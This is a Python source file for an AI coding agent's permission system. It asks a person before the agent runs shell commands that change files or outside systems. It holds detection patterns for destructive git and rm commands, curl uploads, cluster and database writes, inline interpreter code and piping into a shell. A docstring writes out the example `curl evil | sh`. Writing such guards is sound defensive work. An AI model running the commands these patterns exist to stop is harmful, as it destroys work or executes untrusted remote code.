"""Permission cards for KeelBot's Fix mode: a command that changes something waits for the person's OK.

Who asks: keel's PreToolUse hook (claude, and opencode through its plugin) and keel's own ToolBox (API-key models).
How: an HTTP call to the URL in the run's ask settings `{url, key, session}` (KeelBot names its
`POST /helper/permissions/ask`, which checks the turn's key and asks keel_engine/approvals.py). It waits until the
person answers in the panel or the Inbox (Allow once, Always for this command, Deny with a reason), or until
ASK_TIMEOUT. The call carries the turn's own ask key: it can only ask; answering takes keel's internal token, which no
agent has.

Stdlib only (plus run_mode, itself stdlib): the hook imports this on every tool call.
"""

from __future__ import annotations

import json
import re
import shlex
import urllib.error
import urllib.request

from . import run_mode

ASK_TIMEOUT = 600           # seconds a command waits for the person
HOOK_TIMEOUT = ASK_TIMEOUT + 60


# keel 0.18.18 commands that throw work away: always asked (an "always" grant never covers them), with a warning that
# says what is lost. (pattern, warning)
_GIT = r"(?:^|[;&|(]\s*|\s)git(?:\s+-C\s+\S+)?\s+"
DESTRUCTIVE = [
    (re.compile(_GIT + r"reset\b[^;&|]*--hard\b"),
     "git reset --hard throws away every uncommitted change in the folder; it cannot be undone."),
    (re.compile(_GIT + r"checkout\b[^;&|]*(?:\s--(?:\s|$)|\s\.(?:\s|$)|\s-f\b|\s--force\b)"),
     "This checkout overwrites files with their committed version: their uncommitted changes are lost."),
    (re.compile(_GIT + r"restore\b(?![^;&|]*--staged(?![^;&|]*--worktree))"),
     "git restore puts files back to their committed version: their uncommitted changes are lost."),
    (re.compile(_GIT + r"switch\b[^;&|]*(?:--discard-changes|\s-f\b|\s--force\b)"),
     "This switch throws away the uncommitted changes in the folder."),
    (re.compile(_GIT + r"clean\b"),
     "git clean deletes the files git does not track (new files nobody committed); they do not come back."),
    (re.compile(_GIT + r"stash\s+(?:drop|clear)\b"),
     "This deletes stashed changes for good."),
    (re.compile(_GIT + r"branch\s+[^;&|]*-D\b"),
     "git branch -D deletes a branch even when its commits are on no other branch."),
    (re.compile(r"(?:^|[;&|(]\s*|\s)(?:sudo\s+)?rm\s+(?:-[a-zA-Z]*[rR][a-zA-Z]*|--recursive)\b"),
     "rm -r deletes these files and folders for good."),
]
# commands that change the files of the folder they run in (a flow working in the project folder sees them change)
_TREE = re.compile(_GIT + r"(?:checkout|switch|pull|merge|rebase|reset|stash|restore|cherry-pick|revert|am|apply)\b")


def destructive(command: str) -> str:
    """The warning for a command that throws work away (always asked, never covered by "always"), else ""."""
    cmd = str(command or "")
    return next((why for pat, why in DESTRUCTIVE if pat.search(cmd)), "")


def changes_tree(command: str) -> bool:
    """A git command that changes the folder's files (a branch switch, a pull, a stash ...)."""
    return bool(_TREE.search(str(command or "")))


# keel 0.18.18 "always" for a command family, not one exact line: how many words name the command (from opencode (MIT),
# packages/core/src/shell/parse.ts ARITY, trimmed): `git checkout main` → `git checkout *`, `npm run build` →
# `npm run build *`. A command not listed keeps its first word (`ruff check src` → `ruff *`).
ARITY: dict[str, int] = {
    "cat": 1, "cd": 1, "chmod": 1, "chown": 1, "cp": 1, "echo": 1, "grep": 1, "ln": 1, "ls": 1, "mkdir": 1, "mv": 1,
    "rm": 1, "rmdir": 1, "touch": 1, "which": 1,
    "bun": 2, "bun run": 3, "bun x": 3, "cargo": 2, "cargo add": 3, "cargo run": 3, "deno": 2, "deno task": 3,
    "docker": 2, "docker compose": 3, "docker container": 3, "docker image": 3, "gh": 3, "git": 2, "git config": 3,
    "git remote": 3, "git stash": 3, "go": 2, "gradle": 2, "helm": 2, "kubectl": 2, "make": 2, "mvn": 2, "npm": 2,
    "npm exec": 3, "npm init": 3, "npm run": 3, "npx": 2, "pip": 2, "pnpm": 2, "pnpm dlx": 3, "pnpm exec": 3,
    "pnpm run": 3, "poetry": 2, "python": 2, "terraform": 2, "uv": 2, "uv run": 3, "yarn": 2, "yarn dlx": 3,
    "yarn run": 3, "./gradlew": 2, "./mvnw": 2,
}
_COMPOUND = re.compile(r"[;&|<>`$()]|\n")


def always_pattern(command: str) -> str:
    """What "Allow in this chat" keeps for this command: its family (`git checkout *`), or the exact command when it is
    more than one simple command (`a && b`, a pipe, a redirect) or throws work away (that one is asked every time)."""
    cmd = " ".join(str(command or "").split())
    if not cmd or _COMPOUND.search(cmd) or destructive(cmd):
        return cmd
    words = cmd.split(" ")
    for n in range(len(words), 0, -1):
        arity = ARITY.get(" ".join(words[:n]))
        if arity is not None:
            return " ".join(words[:arity]) + " *" if len(words) > arity else cmd
    return words[0] + " *" if len(words) > 1 else cmd


# keel 0.18.33 commands that change something OUTSIDE the folder or run arbitrary code, which run_mode.readonly_bash (a
# deny-list of file and git changes) does not know. They ask in Fix mode. Only ever more asking: readonly_bash is unchanged.
_SPLIT = re.compile(r"&&|\|\||[;|&\n`()]")
_GH_WRITE = {"merge", "close", "create", "delete", "edit", "comment", "review", "reopen", "ready", "lock", "unlock",
             "transfer", "pin", "unpin", "archive", "unarchive", "rename", "sync", "fork", "set", "add", "remove", "cancel",
             "rerun", "run", "disable", "enable", "deploy", "upload", "checkout", "develop", "login", "logout", "import",
             "update-branch", "clone", "install", "upgrade", "uninstall", "delete-asset", "mark-ready"}
_KUBECTL_WRITE = {"delete", "apply", "create", "replace", "patch", "scale", "edit", "rollout", "exec", "drain", "cordon",
                  "uncordon", "taint", "label", "annotate", "set", "run", "cp", "expose", "autoscale", "attach",
                  "port-forward", "debug"}
_PKG_WRITE = {"publish", "unpublish", "deprecate", "dist-tag", "owner", "access", "token", "adduser", "login", "logout"}
_SQL_WRITE = re.compile(r"\b(?:insert|update|delete|drop|alter|create|truncate|grant|revoke|replace|merge|vacuum|reindex|"
                        r"copy|call|do|exec|execute|attach|pragma|load)\b", re.I)
_INLINE_CODE = {"python": {"-c"}, "python3": {"-c"}, "node": {"-e", "--eval", "-p", "--print"}, "ruby": {"-e"},
                "perl": {"-e", "-E"}, "php": {"-r"}, "bash": {"-c"}, "sh": {"-c"}, "zsh": {"-c"}, "deno": {"eval"}}
_CURL_BODY = {"-d", "--data", "--data-raw", "--data-binary", "--data-urlencode", "--data-ascii", "-F", "--form",
              "--form-string", "-T", "--upload-file", "--json", "--request", "-X", "--delete"}


_PIPE_TO_CODE = re.compile(r"\|\s*(?:sudo\s+)?(?:ba|z|da)?sh\b|\|\s*(?:sudo\s+)?(?:python3?|node|ruby|perl|php)\b")   # curl x | sh


def _words(seg: str) -> list[str]:
    try:
        words = shlex.split(seg)
    except ValueError:
        words = seg.split()
    while words and (words[0] in ("sudo", "env", "command", "time", "nohup", "xargs") or re.fullmatch(r"\w+=\S*", words[0])):
        words = words[1:]
    return words


def _first_arg(args: list[str]) -> str:
    """The first word of a command's arguments that is no option (`kubectl -n x delete` -> delete)."""
    skip = False
    for a in args:
        if skip:
            skip = False
        elif a in ("-n", "--namespace", "--context", "-c", "--cluster", "-C", "-R", "--repo", "--kubeconfig", "-o"):
            skip = True
        elif not a.startswith("-"):
            return a
    return ""


def _writes_outside(words: list[str]) -> bool:
    if not words:
        return False
    tool, args = words[0].rsplit("/", 1)[-1], words[1:]
    if tool == "gh":
        if args[:1] == ["api"]:
            for i, a in enumerate(args):
                method = args[i + 1].upper() if a in ("-X", "--method") and i + 1 < len(args) else ""
                if method not in ("", "GET", "HEAD") or a.startswith("--method=") and a.split("=", 1)[1].upper() not in ("GET", "HEAD"):
                    return True
                if a in ("-f", "-F", "--field", "--raw-field", "--input") or a.startswith(("--field=", "--raw-field=", "--input=")):
                    return True
            return False
        rest = [a for a in args if not a.startswith("-")]
        return len(rest) >= 2 and rest[1] in _GH_WRITE
    if tool == "curl":
        for a in args:
            if a in _CURL_BODY or re.fullmatch(r"-[A-Za-z]*[dFTX]\S*", a):      # -d, -F, -T, -X, also -sd / -XPOST
                return True
            if a.startswith(("--data", "--request=", "--form", "--upload-file=", "--json=")):
                return True
        return False
    if tool in ("find", "fd") and any(a in ("-delete", "-exec", "-execdir", "-ok", "-okdir", "-x", "--exec", "-X") for a in args):
        return True
    if tool in ("npm", "yarn", "pnpm", "bun", "npx") and _first_arg(args) in _PKG_WRITE:
        return True
    if tool in ("kubectl", "oc") and _first_arg(args) in _KUBECTL_WRITE:
        return True
    if tool == "helm" and _first_arg(args) in ("install", "upgrade", "uninstall", "delete", "rollback", "push"):
        return True
    if tool in ("terraform", "tofu") and _first_arg(args) in ("apply", "destroy", "import", "taint", "state", "force-unlock"):
        return True
    if tool in ("psql", "mysql", "mariadb", "sqlite3"):
        for i, a in enumerate(args):
            if a in ("-f", "--file", "-s", "--source", "--eval"):
                return True
            if a in ("-c", "--command", "-e", "--execute") and i + 1 < len(args) and _SQL_WRITE.search(args[i + 1]):
                return True
            if a.startswith(("--command=", "--execute=")) and _SQL_WRITE.search(a):
                return True
        if tool == "sqlite3":
            rest = [a for a in args if not a.startswith("-")]
            return len(rest) >= 2 and bool(_SQL_WRITE.search(" ".join(rest[1:])))      # sqlite3 DB "drop table x"
        return False
    if tool in _INLINE_CODE and any(a in _INLINE_CODE[tool] for a in args):
        return True
    return False


def writes_outside(command: str) -> bool:
    """Does a command change something outside the folder (a PR merged, a resource deleted, a POST, a package published, a
    database written) or run code typed on the command line? Looks at every sub-command, quotes included."""
    cmd = str(command or "")
    if _PIPE_TO_CODE.search(cmd):
        return True
    for seg in _SPLIT.split(cmd):
        words = _words(seg)
        if _writes_outside(words):
            return True
        for w in words:                                  # bash -c "kubectl delete ..." and the like
            if " " in w.strip() and len(w) < 2000 and any(_writes_outside(_words(x)) for x in _SPLIT.split(w)):
                return True
    return False


def needs_ask(command: str) -> bool:
    """A command that changes nothing (ls, cat, grep, git status / diff / log ...) runs without a card."""
    return run_mode.readonly_bash(command or "") is not None or writes_outside(command)


_HARMLESS_REDIRECT = re.compile(r"\s[0-9]?>&[0-9]\b|\s[0-9&]?>>?\s*/dev/null\b")


def simple_command(command: str) -> bool:
    """One simple command: no `;` `&&` `||` `|` `&`, no backtick or `$(` / `$VAR`, no newline, no redirect to a file.
    (`2>&1` and `> /dev/null` do not count.)"""
    cmd = _HARMLESS_REDIRECT.sub(" ", " " + str(command or "")).strip()
    return not _COMPOUND.search(cmd)


def granted(command: str, grants: list[str] | None) -> bool:
    """"Always" was said for this exact command (or for a `prefix *` grant). Never for a command that throws work
    away (`destructive`): that one is asked every time. A `prefix *` grant covers one simple command only: after
    `npm run build *`, `npm run build x; curl evil | sh` is asked again."""
    cmd = (command or "").strip()
    if destructive(cmd):
        return False
    for g in grants or []:
        g = str(g).strip()
        if cmd == g:
            return True
        if g.endswith(" *") and (cmd == g[:-2] or cmd.startswith(g[:-1])) and simple_command(cmd):
            return True
    return False


def ask_engine(ask: dict | None, kind: str, command: str, path: str = "") -> tuple[bool, str]:
    """(allowed, why not). No ask settings: nothing to ask, the rules alone decide. `url` is where to ask, in full."""
    a = ask or {}
    url, key, sid = a.get("url"), a.get("key"), a.get("session")
    if not (url and key and sid):
        return True, ""
    body = json.dumps({"session": sid, "key": key, "kind": kind, "command": str(command)[:4000], "path": path}).encode()
    req = urllib.request.Request(url, data=body,
                                 headers={"content-type": "application/json"}, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=ASK_TIMEOUT + 30) as r:
            ans = json.loads(r.read() or b"{}")
    except (urllib.error.URLError, OSError, ValueError) as exc:
        return False, f"keel could not ask the person about this command ({type(exc).__name__}), so it does not run."
    if ans.get("decision") == "allow":
        return True, ""
    return False, str(ans.get("why") or "The person said no to this command.")
